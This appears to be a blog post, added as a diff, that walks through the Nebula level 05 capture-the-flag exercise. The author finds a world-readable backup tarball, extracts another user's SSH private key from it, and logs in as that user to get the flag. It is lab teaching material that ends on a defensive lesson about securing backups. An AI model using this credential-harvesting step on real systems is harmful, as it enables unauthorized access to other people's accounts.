@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <link rel="shortcut icon" type="image/png" href="/assets/image/mythical-bits-logo-1.png">
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/assets/css/styles.css">
+    <title>Nebula Series - Level 05</title>
+  </head>
+  <body>
+    <div id='header'>
+      <img id='logo' src="/assets/image/mythical-bits-logo-1.png" alt="logo"/>
+      <h1> Mythical Bits </h1>
+    </div>
+    <hr />
+    <div id='container'>
+      <div id='nav'>
+  <a href="/index.html">Home</a>
+</div>
+<div class='post-container'>
+  <h3> Nebula Series - Level 05</h3>
+  <p>04 May 2020</p>
+  <hr class='post-title-line'/>
+  <!--more-->
+
+<p>Ok, so the first thing to understand is that you need to secure your backups. The instructions for this level suggest we keep an eye out for weak permissions. Easy enough, let’s
+take a look at the target user’s home directory</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level05@nebula:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
+total 0
+</code></pre></div></div>
+
+<p>At first glance it doesn’t seem like there’s anything there but if we include the <code class="language-plaintext highlighter-rouge">-a</code> flag to list
+hidden files (aka dotfiles) we see some interesting directories:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level05@nebula:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+total 9
+drwxr-x--- 1 flag05 level05   80 2020-04-27 20:02 <span class="nb">.</span>
+drwxr-xr-x 1 root   root      80 2012-08-27 07:18 ..
+drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .backup
+<span class="nt">-rw-------</span> 1 flag05 flag05    23 2020-04-27 20:02 .bash_history
+<span class="nt">-rw-r--r--</span> 1 flag05 flag05   220 2011-05-18 02:54 .bash_logout
+<span class="nt">-rw-r--r--</span> 1 flag05 flag05  3353 2011-05-18 02:54 .bashrc
+drwx------ 2 flag05 flag05    60 2020-04-27 20:02 .cache
+<span class="nt">-rw-r--r--</span> 1 flag05 flag05   675 2011-05-18 02:54 .profile
+drwx------ 2 flag05 flag05    70 2011-11-20 20:13 .ssh
+</code></pre></div></div>
+
+<p>That <code class="language-plaintext highlighter-rouge">.backup</code> looks promising – it’s readable by anyone – let’s see what was backed up.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level05@nebula:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /home/flag05/.backup/
+total 2
+drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 <span class="nb">.</span>
+drwxr-x--- 1 flag05 level05   80 2020-04-27 20:02 ..
+<span class="nt">-rw-rw-r--</span> 1 flag05 flag05  1826 2011-11-20 20:13 backup-19072011.tgz
+</code></pre></div></div>
+
+<p>A tarball… whats it hold? We can use <code class="language-plaintext highlighter-rouge">tar</code> with <code class="language-plaintext highlighter-rouge">-t</code> to list the files in an archive and <code class="language-plaintext highlighter-rouge">-f</code> to
+specify which archive</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level05@nebula:~<span class="nv">$ </span><span class="nb">tar</span> <span class="nt">-tf</span> /home/flag05/.backup/backup-19072011.tgz
+.ssh/
+.ssh/id_rsa.pub
+.ssh/id_rsa
+.ssh/authorized_keys
+</code></pre></div></div>
+
+<p>There they are! The keys to the castle! Let’s extract them to a new <code class="language-plaintext highlighter-rouge">/flag05keys</code> directory in our
+home. Here, <code class="language-plaintext highlighter-rouge">-x</code> indicates we want to extract the files, <code class="language-plaintext highlighter-rouge">-v</code> enables verbose output, <code class="language-plaintext highlighter-rouge">-f</code>
+again identifies the archive we’re working with, and <code class="language-plaintext highlighter-rouge">-C</code> allows us to specify where the extracted
+files should go. tar won’t create the directory for us though so we run <code class="language-plaintext highlighter-rouge">mkdir ~/flag05keys</code> first.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level05@nebula:~<span class="nv">$ </span><span class="nb">mkdir</span> ~/flag05keys <span class="o">&amp;&amp;</span> <span class="nb">tar</span> <span class="nt">-xvf</span> /home/flag05/.backup/backup-19072011.tgz <span class="nt">-C</span> ~/flag05keys
+.ssh/
+.ssh/id_rsa.pub
+.ssh/id_rsa
+.ssh/authorized_keys
+</code></pre></div></div>
+
+<p>Let’s check that the public key is the same as the one in <code class="language-plaintext highlighter-rouge">.ssh/authorized_keys</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level05@nebula:~<span class="nv">$ </span>diff ~/flag05keys/.ssh/authorized_keys ~/flag05keys/.ssh/id_rsa.pub
+</code></pre></div></div>
+
+<p>No output indicates these files are identical. That means, if this “backup” is an accurate
+representation of our target’s <code class="language-plaintext highlighter-rouge">.ssh</code>, we can connect as flag05 over <code class="language-plaintext highlighter-rouge">ssh</code> by providing this private
+key with <code class="language-plaintext highlighter-rouge">-i</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level05@nebula:~<span class="nv">$ </span>ssh <span class="nt">-i</span> ~/flag05keys/.ssh/id_rsa flag05@localhost
+
+The authenticity of host localhost <span class="o">(</span>127.0.0.1<span class="o">)</span> cant be established.
+ECDSA key fingerprint is ea:8d:09:1d:f1:69:e6:1e:55:c7:ec:e9:76:a1:37:f0.
+Are you sure you want to <span class="k">continue </span>connecting <span class="o">(</span><span class="nb">yes</span>/no<span class="o">)</span>? <span class="nb">yes
+</span>Warning: Permanently added localhost <span class="o">(</span>ECDSA<span class="o">)</span> to the list of known hosts.
+
+      _   __     __          __
+     / | / /__  / /_  __  __/ /___ _
+    /  |/ / _ <span class="se">\/</span> __ <span class="se">\/</span> / / / / __ <span class="sb">`</span>/
+   / /|  /  __/ /_/ / /_/ / / /_/ /
+  /_/ |_/<span class="se">\_</span>__/_.___/<span class="se">\_</span>_,_/_/<span class="se">\_</span>_,_/
+
+    exploit-exercises.com/nebula
+
+
+For level descriptions, please see the above URL.
+
+To log <span class="k">in</span>, use the username of <span class="s2">"levelXX"</span> and password <span class="s2">"levelXX"</span>, where
+XX is the level number.
+
+Currently there are 20 levels <span class="o">(</span>00 - 19<span class="o">)</span><span class="nb">.</span>
+
+
+Welcome to Ubuntu 11.10 <span class="o">(</span>GNU/Linux 3.0.0-12-generic i686<span class="o">)</span>
+
+ <span class="k">*</span> Documentation:  https://help.ubuntu.com/
+New release <span class="s1">'12.04 LTS'</span> available.
+Run <span class="s1">'do-release-upgrade'</span> to upgrade to it.
+
+flag05@nebula:~<span class="err">$</span>
+</code></pre></div></div>
+
+<p>It worked! Now that we’re user <code class="language-plaintext highlighter-rouge">flag05</code>, we can run <code class="language-plaintext highlighter-rouge">getflag</code> and move on.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>flag05@nebula:~<span class="nv">$ </span>getflag
+You have successfully executed getflag on a target account
+</code></pre></div></div>
+
+<p>In Summary:</p>
+
+<ul>
+  <li>Security is about the weakest link – protect your backups</li>
+</ul>
+
+
+</div>
+
+    </div>
+  </body>
+</html>
+
